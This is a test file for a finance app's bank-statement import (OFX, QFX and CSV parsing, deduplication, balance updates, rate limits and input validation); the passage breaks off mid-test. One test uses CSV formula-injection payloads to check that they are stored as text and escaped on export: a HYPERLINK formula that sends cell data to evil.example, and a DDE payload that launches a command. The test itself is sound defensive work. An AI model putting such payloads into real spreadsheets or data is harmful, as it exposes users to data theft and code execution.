import { describe, expect, test, mock, beforeEach, afterEach } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { FakeRedis, storageMock, TEST_CTX, ctxKey, registerTestContainer, unscopedDataKeys } from './fake-redis';

// File import into a manual account, as the app calls it: app/api/import
// (preview, import, the list of imports, undo), the stores it keeps
// (lib/import/store.ts), the account's book it commits to
// (lib/manual-txns.ts), and the merge of the imported rows into the Activity
// tab (app/api/transactions) and the data download.

process.env.PLAID_ENCRYPTION_KEY = Buffer.alloc(32, 7).toString('base64');

// /api/transactions syncs Plaid; nothing is linked here, so it answers nothing.
mock.module('@/lib/plaid', () => ({
  plaidClient: {
    transactionsSync: async () => ({
      data: { added: [], modified: [], removed: [], accounts: [], next_cursor: 'c', has_more: false, transactions_update_status: 'HISTORICAL_UPDATE_COMPLETE' },
    }),
  },
}));

// Deserializing like Upstash: what production reads back.
const fake = new FakeRedis({ deserialize: true });
afterEach(() => expect(unscopedDataKeys(fake)).toEqual([]));
mock.module('@/lib/storage', () => storageMock(fake));

const { encrypt } = await import('@/lib/crypto');
const { forgetEpochs } = await import('@/lib/sessions');
const { saveManualAccount, getManualAccount } = await import('@/lib/manual');
const { manualTxnStore, addManualTxn, newManualTxn, editManualTxn } = await import('@/lib/manual-txns');
const { txnAnnotationStore, setExcluded } = await import('@/lib/txn-annotations');
const { importStore, importSettingsStore, importSummaryStore, takeImportRequest, takeImportRead, IMPORT_REQUESTS_PER_HOUR, IMPORT_READS_PER_HOUR } = await import('@/lib/import/store');
const { MAX_FILE_BYTES } = await import('@/lib/import/record');
const { collectUserData, buildUserExport, exportFile } = await import('@/lib/user-export');
const { csvCell } = await import('@/lib/csv');
const { countsInTotals, totalsCurrency } = await import('@/lib/spending');
const routes = await import('@/app/api/import/route');
const transactions = await import('@/app/api/transactions/route');
const annotations = await import('@/app/api/transaction-annotations/route');
const manualAccounts = await import('@/app/api/manual-accounts/route');
type ManualAccount = import('@/lib/manual').ManualAccount;

const ctx = TEST_CTX;
const FIXTURES = join(import.meta.dir, 'fixtures', 'import');
const fixture = (name: string) => new Uint8Array(readFileSync(join(FIXTURES, name)));

const CHECKING: ManualAccount = {
  account_id: 'manual_checking-1',
  name: 'Checking',
  institution_name: 'Cascade CU',
  type: 'depository',
  subtype: 'checking',
  balance: 1000,
  updated_at: '2026-10-01T12:00:00.000Z',
};
const VISA: ManualAccount = { ...CHECKING, account_id: 'manual_visa-1', name: 'Visa', type: 'credit', subtype: 'credit card', balance: 500 };
const SAVINGS: ManualAccount = { ...CHECKING, account_id: 'manual_savings-1', name: 'Savings', subtype: 'savings', balance: 5000 };

const day = (offset: number) => new Date(Date.now() + offset * 86_400_000).toISOString().slice(0, 10);
const compact = (d: string) => d.replace(/-/g, '');

/** An OFX 2.x bank statement with these transactions and ledger balance. */
function ofx(trns: { fitid: string; date: string; amount: number; name: string }[], opts: { acct?: string; ledger?: { amount: number; as_of: string }; card?: boolean } = {}) {
  const list = trns
    .map((t) => `<STMTTRN><TRNTYPE>${t.amount < 0 ? 'DEBIT' : 'CREDIT'}</TRNTYPE><DTPOSTED>${compact(t.date)}120000[-5:EST]</DTPOSTED><TRNAMT>${t.amount.toFixed(2)}</TRNAMT><FITID>${t.fitid}</FITID><NAME>${t.name}</NAME></STMTTRN>`)
    .join('\n');
  const ledger = opts.ledger ? `<LEDGERBAL><BALAMT>${opts.ledger.amount}</BALAMT><DTASOF>${compact(opts.ledger.as_of)}</DTASOF></LEDGERBAL>` : '';
  const from = opts.card ? `<CCACCTFROM><ACCTID>${opts.acct ?? '4111000011112222'}</ACCTID></CCACCTFROM>` : `<BANKACCTFROM><BANKID>325081403</BANKID><ACCTID>${opts.acct ?? '0001234567'}</ACCTID><ACCTTYPE>CHECKING</ACCTTYPE></BANKACCTFROM>`;
  const [rs, trnrs, msgs] = opts.card ? ['CCSTMTRS', 'CCSTMTTRNRS', 'CREDITCARDMSGSRSV1'] : ['STMTRS', 'STMTTRNRS', 'BANKMSGSRSV1'];
  return `<?xml version="1.0"?><?OFX OFXHEADER="200" VERSION="220"?><OFX><${msgs}><${trnrs}><STATUS><CODE>0</CODE></STATUS><${rs}><CURDEF>USD</CURDEF>${from}<BANKTRANLIST>\n${list}\n</BANKTRANLIST>${ledger}</${rs}></${trnrs}></${msgs}></OFX>`;
}

type Res = { status: number; body: any; headers: Headers };
const asRes = async (res: Response): Promise<Res> => ({ status: res.status, body: await res.json(), headers: res.headers });

/** A form upload as the import sheet sends one. */
function upload(meta: Record<string, unknown>, file: Uint8Array | string, name = 'statement.ofx'): Request {
  const form = new FormData();
  const bytes = typeof file === 'string' ? new TextEncoder().encode(file) : file;
  form.set('file', new Blob([bytes as Uint8Array<ArrayBuffer>]), name);
  form.set('meta', JSON.stringify({ file_name: name, ...meta }));
  return new Request('http://localhost/api/import', { method: 'POST', body: form });
}
const post = async (meta: Record<string, unknown>, file: Uint8Array | string, name?: string) => asRes(await routes.POST(upload(meta, file, name)));
const preview = (account_id: string, file: Uint8Array | string, options: object = {}, name?: string) => post({ action: 'preview', account_id, options }, file, name);
const importFile = (account_id: string, file: Uint8Array | string, options: object = {}, extra: object = {}, name?: string) =>
  post({ action: 'import', account_id, options, ...extra }, file, name);
const list = async (account_id: string) => asRes(await routes.GET(new Request(`http://localhost/api/import?account_id=${account_id}`)));
const undo = async (body: object) =>
  asRes(await routes.DELETE(new Request('http://localhost/api/import', { method: 'DELETE', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })));
const undoPlanOf = async (account_id: string, import_id: string) => asRes(await routes.GET(new Request(`http://localhost/api/import?account_id=${account_id}&undo=${import_id}`)));
const book = async (account_id = CHECKING.account_id) => (await manualTxnStore.get(ctx, account_id))?.rows ?? [];

const CARD_MAPPING = { csv: { columns: { date: 0, description: 3, category: 4, debit: 5, credit: 6 }, sign: 'negative-out' } };

/** Every key the fake holds, with its value(s) as stored. */
function snapshot(): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const [k, v] of (fake as any).strings as Map<string, string>) out[k] = v;
  for (const [k, h] of (fake as any).hashes as Map<string, Map<string, string>>) out[k] = Object.fromEntries(h);
  return out;
}
const changedKeys = (before: Record<string, unknown>, after: Record<string, unknown>) =>
  [...new Set([...Object.keys(before), ...Object.keys(after)])].filter((k) => JSON.stringify(before[k]) !== JSON.stringify(after[k])).sort();
/** The keys a test may see change for the request limit alone. */
const COUNTER = ctxKey('import-requests');

/** Runs `fn` with console output collected instead of printed. */
async function quietly<T>(fn: () => Promise<T>): Promise<{ result: T; logged: string }> {
  const saved = [console.error, console.warn, console.log, console.info];
  const lines: string[] = [];
  const keep = (...args: unknown[]) => lines.push(args.map((a) => (a instanceof Error ? `${a.name}: ${a.message} ${a.stack}` : typeof a === 'string' ? a : JSON.stringify(a))).join(' '));
  console.error = console.warn = console.log = console.info = keep;
  try {
    return { result: await fn(), logged: lines.join('\n') };
  } finally {
    [console.error, console.warn, console.log, console.info] = saved;
  }
}

/** Runs `meanwhile` once, just before the next run of the seam's script
 *  `name` reaches storage, as another device would. */
function atNextScript(name: string, meanwhile: () => Promise<unknown>) {
  const original = fake.eval.bind(fake);
  (fake as any).eval = async (script: string, keys: string[], args: string[]) => {
    if (script.split('\n', 1)[0] !== `-- nya:${name}`) return original(script, keys, args);
    delete (fake as any).eval;
    await meanwhile();
    return original(script, keys, args);
  };
}

beforeEach(async () => {
  fake.reset();
  forgetEpochs();
  await registerTestContainer(fake);
  delete (fake as any).eval;
  delete process.env.MAX_TXN_BLOB_CHARS;
  for (const a of [CHECKING, VISA, SAVINGS]) await saveManualAccount(ctx, a);
});

describe('an OFX statement into a manual account', () => {
  test('the preview counts what is new, repeated and unreadable, shows the first rows as they will read, and writes nothing', async () => {
    const before = snapshot();
    const { status, body } = await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, 'checking-ofx102.ofx');
    expect(status).toBe(200);
    const p = body.preview;
    expect(p).toMatchObject({
      format: 'ofx',
      encoding: 'windows-1252',
      counts: { new: 8, present: 0, repeated: 1, unreadable: 0 },
      first_date: '2026-09-01',
      last_date: '2026-09-30',
      currency: 'USD',
      other_currencies: [],
      totals: { out: 2043.47, in: 2450.42 },
      warnings: [],
      account_mismatch: null,
      statement: { label: 'Checking ending 4567', kind: 'bank', account: { mask: '4567' } },
    });
    expect(p.rows).toHaveLength(8);
    expect(p.rows[0]).toEqual({ line: 43, date: '2026-09-01', name: 'ACME CORP PAYROLL', amount: -2450, currency: 'USD', category: null, note: 'DIRECT DEP PPD ID 9876543210', outcome: 'new' });
    expect(p.rows[6]).toMatchObject({ name: 'AT&T *WIRELESS', outcome: 'repeated' });
    // A statement as of September 30 is shown, never set: it is not today's.
    expect(p.balance).toEqual({ amount: 1946.05, as_of: '2026-09-30', from: 1000, refusal: 'past' });
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
  });

  test('importing adds the rows in one write, each with its source, FITID and import, and keeps the raw records', async () => {
    const before = snapshot();
    const { status, body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'checking-ofx102.ofx');
    expect(status).toBe(200);
    expect(body).toMatchObject({ imported: 8, present: 0, repeated: 1, unreadable: 0, balance_updated: false });
    const id = body.import_id as string;
    expect(id).toMatch(/^import:[0-9a-f-]{36}$/);
    const rows = await book();
    expect(rows).toHaveLength(8);
    expect(rows.map((r) => r.source_id)).toEqual(['202609010001', '202609030001', '202609030002', '202609050001', '202609100001', '202609120001', '202609150001', '202609300001']);
    expect(rows[1]).toMatchObject({ account_id: CHECKING.account_id, date: '2026-09-03', amount: 4.5, currency: 'USD', name: 'SQ *BLUE BOTTLE COFFEE', note: 'POS PURCHASE 0902 SEATTLE WA', source: 'import:ofx', import_id: id, category: null });
    expect(rows.every((r) => r.created_at === r.updated_at && r.import_id === id)).toBe(true);
    // The raw records: every one read, in file order, with what became of it.
    const entry = (await importStore.get(ctx, id))!;
    expect(entry).toMatchObject({
      version: 1,
      account_id: CHECKING.account_id,
      format: 'ofx',
      source: 'import:ofx',
      file_name: 'checking-ofx102.ofx',
      encoding: 'windows-1252',
      counts: { imported: 8, present: 0, repeated: 1, unreadable: 0 },
      currency: 'USD',
      first_date: '2026-09-01',
      last_date: '2026-09-30',
      statement: { label: 'Checking ending 4567', mask: '4567', bank_id: '325081403', ledger: { amount: 1946.05, as_of: '2026-09-30' } },
      columns: null,
    });
    expect(entry.records).toHaveLength(9);
    expect(entry.records[1]).toEqual({
      line: 51,
      outcome: 'imported',
      row_id: rows[1].id,
      raw: { TRNTYPE: 'DEBIT', DTPOSTED: '20260903', TRNAMT: '-4.50', FITID: '202609030001', NAME: 'SQ *BLUE BOTTLE COFFEE', MEMO: 'POS PURCHASE 0902 SEATTLE WA' },
    });
    expect(entry.records[6]).toMatchObject({ outcome: 'repeated', line: 90 });
    // Never the account's whole number.
    expect(JSON.stringify(entry)).not.toContain('0001234567');
    // The statement's account is remembered, masked, for the next file.
    expect((await importSettingsStore.get(ctx, CHECKING.account_id))?.ofx).toEqual({ statement: { kind: 'bank', bank_id: '325081403', mask: '4567', type: 'CHECKING' }, flip: false });
    // The balance stays what was typed.
    expect(await getManualAccount(ctx, CHECKING.account_id)).toEqual(CHECKING);
    // And its summary, what the list of imports reads.
    expect(await importSummaryStore.get(ctx, id)).toEqual({
      version: 1,
      account_id: CHECKING.account_id,
      format: 'ofx',
      file_name: 'checking-ofx102.ofx',
      imported_at: entry.imported_at,
      currency: 'USD',
      first_date: '2026-09-01',
      last_date: '2026-09-30',
      counts: { imported: 8, present: 0, repeated: 1, unreadable: 0 },
      statement: 'Checking ending 4567',
      balance_update: null,
    });
    expect(changedKeys(before, snapshot())).toEqual([COUNTER, ctxKey('import-settings'), ctxKey('import-summaries'), ctxKey('imports'), ctxKey('manual-transactions')].sort());
  });

  test('the same statement again adds nothing, and makes no import of it', async () => {
    await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const before = snapshot();
    const again = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(again.body).toMatchObject({ imported: 0, present: 8, repeated: 1, import_id: null });
    expect(await book()).toHaveLength(8);
    expect(await importStore.count(ctx)).toBe(1);
    // Only the counter, and the settings' moment.
    expect(changedKeys(before, snapshot())).toEqual([COUNTER, ctxKey('import-settings')].sort());
  });

  test('an overlapping statement adds only what is new, found by FITID even where the row was edited since', async () => {
    const first = ofx([
      { fitid: 'A1', date: '2026-09-01', amount: -10, name: 'One' },
      { fitid: 'A2', date: '2026-09-02', amount: -20, name: 'Two' },
    ]);
    await importFile(CHECKING.account_id, first);
    const [one] = await book();
    await editManualTxn(ctx, one.id, { name: 'Renamed', category: 'shopping' });
    const second = ofx([
      { fitid: 'A2', date: '2026-09-02', amount: -20, name: 'Two' },
      { fitid: 'A1', date: '2026-09-01', amount: -10, name: 'One' },
      { fitid: 'A3', date: '2026-09-03', amount: -30, name: 'Three' },
    ]);
    const p = await preview(CHECKING.account_id, second);
    expect(p.body.preview.counts).toEqual({ new: 1, present: 2, repeated: 0, replaced: 0, skipped: 0, conflicts: 0, unreadable: 0 });
    expect((await importFile(CHECKING.account_id, second)).body).toMatchObject({ imported: 1, present: 2 });
    expect((await book()).map((r) => r.name)).toEqual(['Renamed', 'Two', 'Three']);
  });

  test('a row typed by hand is matched by its content: one of two identical coffees is found, the other added', async () => {
    const typed = newManualTxn(CHECKING.account_id, { date: '2026-09-03', amount: 4.5, currency: 'USD', name: 'SQ *Blue Bottle Coffee', category: null, note: null });
    await addManualTxn(ctx, typed);
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(body).toMatchObject({ imported: 7, present: 1, repeated: 1 });
    const entry = (await importStore.get(ctx, body.import_id))!;
    expect(entry.records[1]).toMatchObject({ outcome: 'present', row_id: typed.id });
    expect(entry.records[2]).toMatchObject({ outcome: 'imported' });
  });

  test('a file holding several statements asks which; the one chosen is imported', async () => {
    const asked = await preview(SAVINGS.account_id, fixture('two-accounts.qfx'), {}, 'two-accounts.qfx');
    expect(asked.status).toBe(200);
    expect(asked.body.needs).toBe('statement');
    expect(asked.body.statements.map((s: any) => s.label)).toEqual(['Checking ending 3333', 'Savings ending 6666']);
    const done = await importFile(SAVINGS.account_id, fixture('two-accounts.qfx'), { statement: 1 }, {}, 'two-accounts.qfx');
    expect(done.body).toMatchObject({ imported: 1 });
    expect((await book(SAVINGS.account_id)).map((r) => [r.name, r.amount, r.source_id])).toEqual([['INTEREST EARNED', -3.21, 'QFX-SAV-1']]);
  });

  test('a file for another account than last time is caught: said in the preview, refused until the person says go ahead', async () => {
    await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const other = ofx([{ fitid: 'Z1', date: '2026-09-04', amount: -5, name: 'Other bank' }], { acct: '9999888877' });
    const p = await preview(CHECKING.account_id, other);
    expect(p.body.preview.account_mismatch).toEqual({ expected: 'an account ending 4567 at bank 325081403', found: 'an account ending 8877 at bank 325081403' });
    const refused = await importFile(CHECKING.account_id, other);
    expect(refused.status).toBe(409);
    expect(refused.body.error).toBe('This file is for an account ending 8877 at bank 325081403, but Checking’s last OFX file was for an account ending 4567 at bank 325081403. Check it is the right file, then import it anyway.');
    expect(await book()).toHaveLength(8);
    expect((await importFile(CHECKING.account_id, other, {}, { acknowledge_account: true })).body).toMatchObject({ imported: 1 });
  });

  test('a credit card statement: purchases out, the payment in, and its balance owed offered only when it is today’s', async () => {
    const today = day(0);
    const card = ofx(
      [
        { fitid: 'C1', date: day(-3), amount: -87.2, name: 'GROCER' },
        { fitid: 'C2', date: day(-2), amount: 500, name: 'PAYMENT - THANK YOU' },
      ],
      { card: true, ledger: { amount: -1234.56, as_of: today } }
    );
    const p = (await preview(VISA.account_id, card)).body.preview;
    expect(p.rows.map((r: any) => r.amount)).toEqual([87.2, -500]);
    expect(p.balance).toEqual({ amount: 1234.56, as_of: today, from: 500, refusal: null });
    // A card statement onto a checking account: its sign would mean the
    // opposite, so it is only shown.
    expect((await preview(CHECKING.account_id, card)).body.preview.balance.refusal).toBe('kind');
  });
});

describe('the statement’s balance', () => {
  const today = day(0);
  const statement = (as_of: string, amount = 2345.67) => ofx([{ fitid: 'B1', date: day(-1), amount: -12, name: 'Shop' }], { ledger: { amount, as_of } });

  test('set only when asked, as a normal balance update from the figure the preview showed: rows, balance, estimate rebuilt, cache dropped', async () => {
    await fake.set(ctxKey('history:backfill-done'), 'v3');
    const done = await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(done.status).toBe(200);
    expect(done.body).toMatchObject({ imported: 1, balance_updated: true, balance: 2345.67 });
    expect((await getManualAccount(ctx, CHECKING.account_id))!.balance).toBe(2345.67);
    expect(fake.strings.has(ctxKey('history:backfill-done'))).toBe(false);
    expect((await importStore.get(ctx, done.body.import_id))!.balance_update).toEqual({ from: 1000, to: 2345.67, as_of: today });
    // Sent again: nothing new, and the balance is already the statement's.
    const again = await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(again.body).toMatchObject({ imported: 0, balance_updated: true });
    // Without the tick, an import never moves it.
    await importFile(SAVINGS.account_id, statement(today));
    expect((await getManualAccount(ctx, SAVINGS.account_id))!.balance).toBe(5000);
  });

  test('yesterday’s is offered too; an older one is shown and refused if asked, so no past figure is set as today’s', async () => {
    expect((await preview(CHECKING.account_id, statement(day(-1)))).body.preview.balance.refusal).toBeNull();
    const old = day(-2);
    expect((await preview(CHECKING.account_id, statement(old))).body.preview.balance).toEqual({ amount: 2345.67, as_of: old, from: 1000, refusal: 'past' });
    const refused = await importFile(CHECKING.account_id, statement(old), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(refused.status).toBe(400);
    expect(await book()).toEqual([]);
    expect((await getManualAccount(ctx, CHECKING.account_id))!.balance).toBe(1000);
  });

  test('a balance changed since the preview refuses the whole import, as the quick-add form refuses its add', async () => {
    await saveManualAccount(ctx, { ...CHECKING, balance: 1111 });
    const refused = await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(refused.status).toBe(409);
    expect(refused.body).toMatchObject({ balance: 1111 });
    expect(refused.body.error).toContain('since the preview, so nothing was imported');
    expect(await book()).toEqual([]);
    // Nor a figure other than the statement's.
    expect((await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1111, to: 9 } })).status).toBe(400);
  });

  test('nothing the import does writes the history layer, recorded or estimated, balance or not', async () => {
    const layers = ['history:net-worth', 'history:net-worth:est', 'history:accounts', 'history:accounts:partial', 'history:accounts:est', 'history:accounts:est:ext'];
    for (const k of layers) await fake.set(ctxKey(k), `stored-${k}`);
    const history = () => Object.fromEntries(Object.entries(snapshot()).filter(([k]) => layers.some((l) => k === ctxKey(l))));
    const before = history();
    await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    await importFile(SAVINGS.account_id, statement(today), {}, { balance: { from: 5000, to: 2345.67 } });
    await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    await undo({ account_id: CHECKING.account_id, import_id: body.import_id, confirm: true });
    expect(history()).toEqual(before);
    expect(Object.keys(snapshot()).filter((k) => k.startsWith(ctxKey('history:')) && !layers.some((l) => k === ctxKey(l)))).toEqual([]);
  });
});

describe('a CSV file', () => {
  test('without a mapping, the route says what the sheet must ask, with the columns, the first rows and a guess', async () => {
    const { status, body } = await preview(VISA.account_id, fixture('card-debit-credit.csv'), {}, 'card.csv');
    expect(status).toBe(200);
    expect(body).toMatchObject({ needs: 'mapping', format: 'csv', guess: { date: 0, description: 3, category: 4, debit: 5, credit: 6 } });
    expect(body.table.header).toHaveLength(7);
    expect(body.table.sample[0].cells[3]).toBe('AMAZON MKTPL*2X3Y4, AMZN.COM/BILL WA');
  });

  test('imports with the mapping, remembers it by column name, and a second import reports what it skipped', async () => {
    const first = await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    expect(first.body).toMatchObject({ imported: 11, present: 0 });
    const rows = await book(VISA.account_id);
    expect(rows.filter((r) => r.name === 'BLUE BOTTLE COFFEE SEATTLE WA')).toHaveLength(2); // two coffees, both real
    expect(rows[0]).toMatchObject({ source: 'import:csv', source_id: '2026-09-28|USD|2399|amazon mktpl 2x3y4 amzn com bill wa', category: 'merchandise' });
    const settings = (await list(VISA.account_id)).body.settings;
    expect(settings.csv).toEqual({
      columns: { date: 'Transaction Date', description: 'Description', debit: 'Debit', credit: 'Credit', category: 'Category' },
      sign: 'negative-out',
      decimal: '.',
      date_order: null,
      delimiter: ',',
      currency: 'USD',
    });
    const again = await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    expect(again.body).toMatchObject({ imported: 0, present: 11 });
    // One coffee deleted since: that one comes back, the rest are skipped.
    const coffee = (await book(VISA.account_id)).find((r) => r.name.startsWith('BLUE BOTTLE'))!;
    await manualTxnStore.update(ctx, VISA.account_id, (b) => ({ ...b!, rows: b!.rows.filter((r) => r.id !== coffee.id) }));
    expect((await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING)).body).toMatchObject({ imported: 1, present: 10 });
  });

  test('a European file: decimal commas, day first, euros, its summary lines counted', async () => {
    const options = { csv: { columns: { date: 0, description: 2, amount: 7, note: 4, currency: 8 }, sign: 'negative-out' } };
    const p = (await preview(CHECKING.account_id, fixture('giro-semicolon.csv'), options, 'giro.csv')).body.preview;
    expect(p).toMatchObject({ currency: 'EUR', counts: { new: 6 }, read: { date_order: 'dmy', date_style: 'dmy', decimal: ',', delimiter: ';', header_line: 13, skipped: 9 }, encoding: 'windows-1252' });
    expect(p.rows[1]).toMatchObject({ name: 'Stadtwerke München', amount: 89, currency: 'EUR', date: '2026-09-29' });
  });

  test('ambiguous dates are asked about, never guessed', async () => {
    const text = 'Date,Description,Amount\n09/01/2026,A,-1\n09/02/2026,B,-2\n';
    const r = await preview(CHECKING.account_id, text, { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' } }, 'a.csv');
    expect(r.body).toMatchObject({ needs: 'date_order', detection: { ambiguous: true } });
    const done = await importFile(CHECKING.account_id, text, { date_order: 'dmy', csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' } }, {}, 'a.csv');
    expect((await book()).map((x) => x.date)).toEqual(['2026-01-09', '2026-02-09']);
    expect(done.body.imported).toBe(2);
  });

  test('a formula in a description is stored as text, kept as text in the download, and guarded in any CSV', async () => {
    const { body } = await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    const stored = (await book(VISA.account_id)).map((r) => r.name);
    const formula = '=HYPERLINK("http://evil.example/?x="&A1,"Refund")';
    expect(stored).toContain(formula);
    expect(stored).toContain('+SUM(1+2)');
    expect(stored).toContain("@cmd|' /C calc'!A0");
    const doc = buildUserExport(await collectUserData({ ctx, userId: null }), new Date());
    const rows = (doc as any)['manual-transactions'][0].value.rows as { name: string }[];
    expect(rows.map((r) => r.name)).toContain(formula);
    const records = (doc as any).imports[0].value.records as { raw: string[] }[];
    expect(records.some((r) => r.raw[3] === formula)).toBe(true);
    // In the written file, a JSON string: nothing a spreadsheet would run.
    expect([...exportFile(doc, 'json').pieces()].join('')).toContain(JSON.stringify(formula));
    for (const name of stored.filter((n) => /^[=+@-]/.test(n))) expect(csvCell(name).replace(/^"/, '')[0]).toBe("'");
    expect(body.import_id).toBeTruthy();
  });
});

describe('limits and refusals', () => {
  test('a request that claims more than the limit is refused before its body is read', async () => {
    let read = false;
    const req = {
      headers: new Headers({ 'content-length': '1000000000', 'content-type': 'multipart/form-data; boundary=x' }),
      arrayBuffer: async () => {
        read = true;
        return new ArrayBuffer(0);
      },
    } as unknown as Request;
    const res = await asRes(await routes.POST(req));
    expect(res.status).toBe(413);
    expect(read).toBe(false);
  });

  test('a file over 3 MB is refused, and so is a body over the limit whatever it claims', async () => {
    const big = new Uint8Array(MAX_FILE_BYTES + 1).fill(0x41);
    expect((await preview(CHECKING.account_id, big)).status).toBe(413);
    const req = new Request('http://localhost/api/import', { method: 'POST', headers: { 'content-type': 'multipart/form-data; boundary=x' }, body: new Uint8Array(MAX_FILE_BYTES + 70 * 1024) });
    expect((await routes.POST(req)).status).toBe(413);
  });

  test('more than 10,000 transactions is refused whole, with nothing written', async () => {
    const many = 'Date,Description,Amount\n' + Array.from({ length: 10_001 }, (_, i) => `2026-09-01,Row ${i},-1`).join('\n');
    const r = await importFile(CHECKING.account_id, many, { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' } }, {}, 'many.csv');
    expect(r.status).toBe(422);
    expect(r.body.error).toContain('more than 10,000 transactions');
    expect(await manualTxnStore.count(ctx)).toBe(0);
  });

  test('a request is counted before its body is read: one that turns out invalid counts, and one over the limit is never read', async () => {
    for (let i = 0; i < IMPORT_REQUESTS_PER_HOUR - 2; i++) await takeImportRequest(ctx);
    expect((await post({ action: 'peek', account_id: CHECKING.account_id }, 'x')).status).toBe(400);
    expect((await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'))).status).toBe(200);
    let read = false;
    const req = {
      headers: new Headers({ 'content-type': 'multipart/form-data; boundary=x' }),
      arrayBuffer: async () => {
        read = true;
        return new ArrayBuffer(0);
      },
    } as unknown as Request;
    expect((await routes.POST(req)).status).toBe(429);
    expect(read).toBe(false);
  });

  test('reading the list of imports is limited too, apart from imports, and fails closed', async () => {
    for (let i = 0; i < IMPORT_READS_PER_HOUR - 1; i++) await takeImportRead(ctx);
    expect((await list(CHECKING.account_id)).status).toBe(200);
    const over = await list(CHECKING.account_id);
    expect(over.status).toBe(429);
    expect(over.body.error).toMatch(/^Past imports can be listed 300 times an hour\. Try again in \d+ minutes?\.$/);
    // Imports are counted apart.
    expect((await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'))).status).toBe(200);
    fake.reset();
    await registerTestContainer(fake);
    forgetEpochs();
    await saveManualAccount(ctx, CHECKING);
    fake.failNext('eval');
    const { result } = await quietly(() => list(CHECKING.account_id));
    expect(result.status).toBe(503);
  });

  test('a file built to make a large answer is refused with a small one', async () => {
    const MB3 = 3 * 1024 * 1024 - 1024;
    let wide = '';
    while (wide.length < MB3) wide += 'a,';
    let accounts = '';
    while (accounts.length < MB3) accounts += '!Type:Bank\n';
    const one = '<STMTRS><CURDEF>USD<BANKTRANLIST><STMTTRN><DTPOSTED>20261001<TRNAMT>-1<FITID>1<NAME>a</STMTTRN></BANKTRANLIST></STMTRS>';
    let statements = '<OFX><BANKMSGSRSV1><STMTTRNRS>';
    while (statements.length < MB3 - one.length) statements += one;
    for (const [file, name, error] of [
      [wide, 'wide.csv', 'Line 1 of this file has more than 200 fields, more than a bank’s export has, so it can’t be read as a table.'],
      [accounts, 'accounts.qif', 'This file holds more than 50 accounts, more than one import can choose from. Export one account at a time.'],
      [statements, 'statements.ofx', 'This file holds more than 50 statements, more than one import can choose from. Export one account at a time.'],
    ]) {
      const res = await routes.POST(upload({ action: 'preview', account_id: CHECKING.account_id, options: {} }, file, name));
      const text = await res.text();
      expect(res.status).toBe(422);
      expect(JSON.parse(text).error).toBe(error);
      expect(text.length).toBeLessThan(1_000);
    }
  });

  test('requests are limited per person an hour, and a limit that can’t be read refuses rather than opens', async () => {
    for (let i = 0; i < IMPORT_REQUESTS_PER_HOUR - 1; i++) await takeImportRequest(ctx);
    expect((await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'))).status).toBe(200);
    const over = await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(over.status).toBe(429);
    expect(Number(over.headers.get('Retry-After'))).toBeGreaterThan(0);
    expect((await undo({ account_id: CHECKING.account_id, import_id: 'import:0b6f5a52-3c1d-4e2f-8a9b-1c2d3e4f5a6b', confirm: true })).status).toBe(429);
    fake.reset();
    await registerTestContainer(fake);
    forgetEpochs();
    await saveManualAccount(ctx, CHECKING);
    fake.failNext('eval');
    const { result } = await quietly(() => preview(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(503);
  });

  test('every field of the request is checked', async () => {
    const file = fixture('checking-ofx102.ofx');
    expect((await post({ action: 'peek', account_id: CHECKING.account_id }, file)).status).toBe(400);
    expect((await post({ action: 'preview', account_id: 'acct_plaid' }, file)).status).toBe(400);
    expect((await post({ action: 'preview', account_id: 'manual_gone' }, file)).status).toBe(404);
    for (const options of [
      { statement: -1 },
      { flip: 'yes' },
      { currency: 'USX' },
      { date_order: 'ymd' },
      { decimal: ';' },
      { extra: 1 },
      { csv: { columns: { date: 0 }, sign: 'negative-out' } },
      { csv: { columns: { date: 0, description: 1, nope: 2 }, sign: 'negative-out' } },
      { csv: { columns: { date: 0, description: 1 }, sign: 'sideways' } },
      { conflicts: { all: 'merge' } },
      { conflicts: { each: { x: 'new' } } },
      { conflicts: { each: { '10000': 'new' } } },
      { conflicts: { each: Object.fromEntries(Array.from({ length: 1001 }, (_, i) => [String(i), 'new'])) } },
      { conflicts: { other: 1 } },
    ]) {
      expect((await preview(CHECKING.account_id, file, options)).status, JSON.stringify(options)).toBe(400);
    }
    expect((await post({ action: 'import', account_id: CHECKING.account_id, balance: { from: 'x', to: 1 } }, file)).status).toBe(400);
    expect((await preview(CHECKING.account_id, new Uint8Array(0))).status).toBe(400);
    const notForm = new Request('http://localhost/api/import', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
    expect((await routes.POST(notForm)).status).toBe(400);
    const noMeta = new FormData();
    noMeta.set('file', new Blob([file]), 'a.ofx');
